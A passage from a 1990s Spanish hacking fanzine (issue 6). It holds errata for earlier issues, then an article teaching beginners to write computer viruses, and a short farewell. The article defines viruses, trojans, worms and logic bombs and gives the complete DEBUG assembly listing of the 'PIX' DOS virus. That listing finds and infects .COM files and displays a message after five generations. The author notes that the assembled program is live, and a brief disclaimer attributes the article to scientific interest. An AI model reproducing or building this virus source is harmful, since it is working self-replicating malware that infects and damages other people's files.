Eljaker se va a tomar un descanso, le hemos encargado el trabajo a +8D2,
y esperamos tenerlo para el proximo numero. Perdonad por el retraso.


Numero 2:
---------

ARTICULO 1.
-...bienvenido a la segunda entrega de este [fancine]-->fanzine
-...incitar a la [legalidad]-->ilegalidad


Numero 3.
---------

-El nombre de uno de nuestros colaboradores, estaba mal escrito, en vez
de poner 'duque' deberia poner 'duke'.

ARTICULO 4.
-Este articulo ha tenido mucho exito, y por ello, sera revisado y ampliado
en un proximo numero de la revista. Mientras tanto, ahi van unos pequeคos
parches.
-...el escaneo de lineas en [espaคa]-->Espaคa
-En este articulo se menciona que los telefons moviles son mas dificiles
de localizar, esto no es del todo correcto. El numero de un movil, a menos 
que sea modificado o reprogamado, puede ser localizado con la misma
facilidad, que con la que se localiza el numero de un telefono fijo. Eso
si, si el movil a sido reprogramado, entonces si que es mucho mas dificil
averiguar su numero y su poseedor.
-...telefonos de voz, y [ahorraemos]-->ahorraremos


Numero 4 y Numero 5.
--------------------

-Ufff, como estos numeros son muy largos, no os voy a poner todas las erratas,
pero si os interesa, la version revisada saldra dentro de poco.
-En cuanto a los errores de contenido:
==>Las definiciones que se dan en algunos articulos pueden ser opinables, y 
es que en este mundo del hacking, nada esta 'estandarizado' y por lo tanto la 
mayoria de los conceptos son subjetivos o varian dependiendo del contexto.
==>Hemos recibido comentarios sobre el articulo de traceo de llamadas en
infovia. La verdad es que el articulo no era muy detallado e intentaba
simplificar el tema para su mayor comprension, por eso puede que haya
imprecisiones y algunos errores. Si alguien conoce en profundidad el
funcionamiento de infovia, le agradeceriamos que lo explicase con mas
claridad.


En general.
-----------

-Debido al formato de la revista, la mayoria de los articulos, no llevan
acentos por los problemas de compatibilidad con algunos sistemas, que
en vez de mostrar acentos muestran caracteres estraคos. (Para evitar
estos problemas, la version final de la revista esta creada en un
formato ASCII compatible con el Edit del Dos)
-Algunos de los nuestros escriben hacking, cracking, etc... sin la 'g'
final, no os preocupeis, es igual que escirbir en vez de 'c' una 'k'
(Ej. Vaka) o en vez de poner 'o' poner '0' (Ej. Cer0) son manias.


Y si no teneis ganas de corregir a mano cada uno de los errores, no os                                          
preocupeis, dentro de poco sacaremos un pack, con los 5 primeros numeros
revisados, y tal vez, con algun regalito tambien.




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 11. EL DIVERTIDO MUNDO DE LOS VIRUS                                       บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
   
   
   Hola a todos, bienvenidos al divertido mundo de los virus, esos pequeคos
  engendros que tan divertidos son. En estos articulos enseคare las tecnicas
  basicas para crear un virus simple, pero no por eso menos efectivo.

 IDEAS BASICAS
 ===============
   Antes de empezar a soltar el rollo voy a hacer, unas pequeคas definiciones
  sobre el mundo de los virus, es mas que nada para los que no tengan idea
  de casi nada de este mundo, para los demas seguir mas abajo ;-)

  .VIRUS: Es un pequeคo programa generalmente escrito en ensamblador, aunque
    los hay escritos en pascal y otros lenguajes, el cual es capaz
    replicar su codigo de forma continuada, hasta llegar a una fecha
    predeterminada o numero de encendidos del ordenar en la cual el virus
    hace su accion nociva por asi decirlo.

  .CABALLO DE TROYA (TROYANO): Es un programa legal (en apariencia) que
    lleva en su interior un codigo daคino en cuestion, este no se autoreplica
    solo se ejecuta una vez (y ya es suficiente para que acabe con tu disco),
    uno de los mas famoso el Trojan AIDS.
 
  .GUSANO: Es un programa que se desplaza por la memoria del ordenador(RAM),
    busca zonas de memoria desocupadas en las que realiza copias repetidas
    hasta provocar un desbordamiento de memoria, se usan mayoritariamente
    en redes, uno de los mas famosos fue el de Robert Morris.

  .BOMBA LOGICA: Es un pequeคo programa que permanece, oculto y ni se
    autoduplica ni se desplaza en memoria, tan solo espera a que llegue
    una fecha determinada o que alguien ejecute una orden y entonces se
    activa el proceso destructivo de la bomba al igual que el caballo de
    troya solo se ejecuta una vez.

   Bien es hora de pasar a lo que realmente interesa el principio de un
    virus. Solo se necesita saber algo de programacion, y ganas de aprender
    ya vereis que al final no es tan dificil hacer un virus simple y 
    a partir de ahi mejorarlo.

  Primero veamos como actua un virus

 1- Busca un fichero para infectar (Ej.: EXE,COM,OVL...)
 2- Lo abre y comprueba el tipo de fichero,tamaคo y si esta infectado.
 3- Si esta infectado, lo cierra y busca otro
 4- Por el contrario sino lo infecta.
 5- Le devuelve el control al programa infectandose y continua la ejecucion
     normal.

 Llego la hora del ejemplo. Es un virus llamado PIX, quiza no es muy famoso
  y mucho menos una maravilla de virus, pero sirve de ejemplo.

           ญญญ CUIDADO !!! si  lo haceis COM con el DEBUG,
         el virus estara activo, asi que si lo ejecutais ya os
         imaginais lo que pasara ;-)))
        

NPIX.COM
A
JMP 0116
DB  90,49,56,00,2A,2E,43,4F,4D,00,4F,04,00,00,01,00,00,00,00,00
MOV AX,CS
ADD AX,1000
MOV ES,AX
INC BYTE PTR [0105] ; Incrementa el contador de generaciones.
MOV SI,0100
XOR DI,DI
MOV CX,014F
REPZ
MOVSB
MOV DX,025F
MOV AH,1A
INT 21              ;Se encarga de crear el DTA para los ficheros...
MOV DX,0106         ;con extension.COM
MOV CX,0018
MOV AH,4E
INT 21
JB 019E
MOV DX,027D
MOV AX,3D02         ;Abre el fichero en modo lectura/escritura.
INT 21
MOV [0114],AX
MOV BX,AX
PUSH ES
POP DS
MOV DX,034F
MOV CX,FFFF
MOV AH,3F
INT 21
ADD AX,034F
CS:
MOV [0112],AX       ;A continuacion, la firma del virus:
dB 3E,81,3E
DB 52,03
DB 49,56
JZ 0188
XOR CX,CX
MOV DX,CX
CS:
MOV BX,[0114]
MOV AX,4200
INT 21              ;Desplaza el puntero.
JB 0188
MOV DX,0000
CS:
MOV CX,[0112]
CS:
MOV BX,[0114]
MOV AH,40
INT 21              ;Salva virus y programa contaminado.
CS:
MOV BX,[0112]
MOV AH,3E
INT 21              ;Cierra el fichero.
PUSH CS
POP DS
MOV AH,4F
MOV DX,025F
INT 21
JB 019E
JMP 013E
MOV DX,0080
MOV AH,1A
INT 21              ;Restaura el DTA original.
CMP BYTE PTR [0105],05 ; จQuinta generacion?...
JB 0207                ; Si es asi, comienza el espectaculo.
MOV AX,0040
MOV DS,AX
MOV AX,[006C]       ; Aleatoriedad de manifestacion del virus...
PUSH CS             ; mediante el registro de decimas de segundo.
POPDS
AND AX,0001
JZ 0207
MOV DX,01C4
MOV AH,09
INT 21
INT 20              ; A continuacion, el mensaje del virus.
DB 59,4F,55,52,20,50,43,20,48,41,56,45,20,41,20,4D,45,53,53,41,4A,52
DB 20,46,4F,52,20,59,4F,55,20,3A,20,4A,4F,44,45,54,45,20,59,20,45,53
DB 50,45,52,41,20,43,41,4D,49,4C,4F,20,4A,4F,53,45,20,43,45,4C,41,2E
DB 24
MOV SI,0224
MOV CX,002B
XOR DI,DI
REPZ
MOVSB
XOR DI,DI
CS:
MOV WORD PTR [010E],0000
CS:
MOV [0110],ES
CS:
JMP FAR [010E]
PUSH DS
POP ES
MOV SI,044F
CMP BYTE PTR [0105],01
JNZ 0234
SUB SI,0200
MOV DI,0100
MOV CX,FFFF
SUB CX,SI
REPZ
MOVSB
CS:
MOV WORD PTR [0100],0100
CS:
MOV [0102],DS
CS:
JMP FAR [0100]      ; Salto a la ejecucion del verdadero programa...
INT 20              ; siempre que se trate de una generacion...
INT 20              ; posterior a la primera, y por tanto, exista.
DB 0,0

R CX
154
W
Q

  * Todo lo explicado es puramente para interes cientifico o estudio, el
   autor del articulo no se hace responsable del mal uso de lo aqui expuesto
   ni de los daคos que estos puedan causar.

  NOTA: Aun no soy ningun experto, en la tecnica de los virus, solo
    intento aportar una ayuda para los que como yo una vez, empiezan ahora
    en este mundo de los virus, la informacion aqui expuesta esta sacada
    de investigaciones propias y de largas horas de busqueda de informacion
    en otras revistas y textos de qualquier tipo hallados en INTERNET.
    A todos ellos GRACIAS. O:-)

                                                POLIMORPH




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 12. DESPEDIDA                                                             บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Adios a los que se van y enhorabuena a los que se quedan.




-FINAL DEL NUMERO 6-

